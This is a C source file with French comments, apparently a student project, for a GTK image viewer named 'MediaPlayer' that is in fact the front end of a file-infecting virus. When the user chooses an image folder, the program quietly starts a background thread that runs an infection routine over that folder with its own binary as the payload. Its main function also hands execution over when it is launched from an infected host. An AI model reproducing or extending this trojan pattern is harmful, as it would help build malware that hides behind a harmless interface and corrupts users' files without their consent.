//
// Created by armotik on 24/03/25.
//

#include <gtk/gtk.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <pthread.h>

#include "infection.h"
#include "transfert.h"
#include "mediaplayer.h"

GtkWidget *liste_images;
GtkWidget *image_affichee;
char chemin_selection[MAX_PATH_LEN] = "";

// Ouvre une image dans la zone centrale
void afficher_image_dans_media_player(const char *filename) {
    char chemin_complet[MAX_PATH_LEN];
    snprintf(chemin_complet, sizeof(chemin_complet), "%s/%s", chemin_selection, filename);

    gtk_image_set_from_file(GTK_IMAGE(image_affichee), chemin_complet);
}


// Callback : clic sur une image dans la liste
void on_image_selectionnee(GtkListBox *box, GtkListBoxRow *row, gpointer user_data) {
    (void) box;
    (void) user_data;

    const char *filename = gtk_label_get_text(GTK_LABEL(gtk_bin_get_child(GTK_BIN(row))));
    afficher_image_dans_media_player(filename);
}

// Remplit la liste d'images depuis le dossier sélectionné
void charger_images(const char *dossier) {
    gtk_container_foreach(GTK_CONTAINER(liste_images), (GtkCallback) gtk_widget_destroy, NULL);

    DIR *dir = opendir(dossier);
    if (!dir) return;

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, ".jpg") || strstr(entry->d_name, ".png") || strstr(entry->d_name, ".bmp")) {
            GtkWidget *label = gtk_label_new(entry->d_name);
            gtk_widget_set_halign(label, GTK_ALIGN_START);
            gtk_list_box_insert(GTK_LIST_BOX(liste_images), label, -1);
        }
    }

    closedir(dir);
    gtk_widget_show_all(liste_images);
}

// Thread infection
typedef struct {
    char chemin[MAX_PATH_LEN];
    char virus_path[MAX_PATH_LEN];
} ThreadInfectArgs;

void *thread_infection(void *arg) {
    ThreadInfectArgs *args = (ThreadInfectArgs *) arg;
    explorer_et_infecter(args->chemin, args->virus_path);
    free(arg);
    return NULL;
}

// Callback : bouton choisir dossier
void on_choisir_dossier_clicked(GtkWidget *widget, gpointer window_ptr) {
    (void) widget;

    GtkWidget *dialog = gtk_file_chooser_dialog_new(
        "Choisir un dossier d'images",
        GTK_WINDOW(window_ptr),
        GTK_FILE_CHOOSER_ACTION_SELECT_FOLDER,
        "_Annuler", GTK_RESPONSE_CANCEL,
        "_Choisir", GTK_RESPONSE_ACCEPT,
        NULL
    );

    if (gtk_dialog_run(GTK_DIALOG(dialog)) == GTK_RESPONSE_ACCEPT) {
        char *folder = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(dialog));
        strncpy(chemin_selection, folder, sizeof(chemin_selection) - 1);
        chemin_selection[sizeof(chemin_selection) - 1] = '\0';
        g_free(folder);

        // Lancer infection en arrière-plan
        ThreadInfectArgs *args = malloc(sizeof(ThreadInfectArgs));
        strncpy(args->chemin, chemin_selection, MAX_PATH_LEN);
        strncpy(args->virus_path, "./MediaPlayer", MAX_PATH_LEN);
        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, thread_infection, args) == 0) {
            pthread_detach(thread_id);
        }

        // Charger la liste d'images
        charger_images(chemin_selection);
        gtk_image_clear(GTK_IMAGE(image_affichee));
    }

    gtk_widget_destroy(dialog);
}

// Callback quitter
static void on_quitter_clicked(GtkWidget *widget, gpointer data) {
    (void) widget;
    (void) data;
    gtk_main_quit();
}

int main(int argc, char *argv[]) {
    if (!strstr(argv[0], "MediaPlayer")) {
        transferer_execution_si_necessaire(argv[0], argv);
        return 0;
    }

    gtk_init(&argc, &argv);

    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "🎵 MediaPlayer");
    gtk_window_set_default_size(GTK_WINDOW(window), 800, 500);
    gtk_container_set_border_width(GTK_CONTAINER(window), 10);
    g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

    // Layout vertical principal
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 8);
    gtk_container_add(GTK_CONTAINER(window), vbox);

    // Layout horizontal : Liste à gauche, image à droite
    GtkWidget *hbox = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 10);
    gtk_box_pack_start(GTK_BOX(vbox), hbox, TRUE, TRUE, 0);

    // Liste des images
    liste_images = gtk_list_box_new();
    gtk_widget_set_size_request(liste_images, 200, -1);
    g_signal_connect(liste_images, "row-activated", G_CALLBACK(on_image_selectionnee), NULL);
    gtk_box_pack_start(GTK_BOX(hbox), liste_images, FALSE, TRUE, 0);

    // Zone d'affichage de l'image sélectionnée
    image_affichee = gtk_image_new();
    gtk_box_pack_start(GTK_BOX(hbox), image_affichee, TRUE, TRUE, 0);

    // Boutons en bas
    GtkWidget *btn_dossier = gtk_button_new_with_label("Choisir un dossier source");
    gtk_box_pack_start(GTK_BOX(vbox), btn_dossier, FALSE, FALSE, 0);
    g_signal_connect(btn_dossier, "clicked", G_CALLBACK(on_choisir_dossier_clicked), window);

    GtkWidget *btn_quitter = gtk_button_new_with_label("Quitter");
    gtk_box_pack_start(GTK_BOX(vbox), btn_quitter, FALSE, FALSE, 0);
    g_signal_connect(btn_quitter, "clicked", G_CALLBACK(on_quitter_clicked), NULL);

    gtk_widget_show_all(window);
    gtk_main();

    return 0;
}
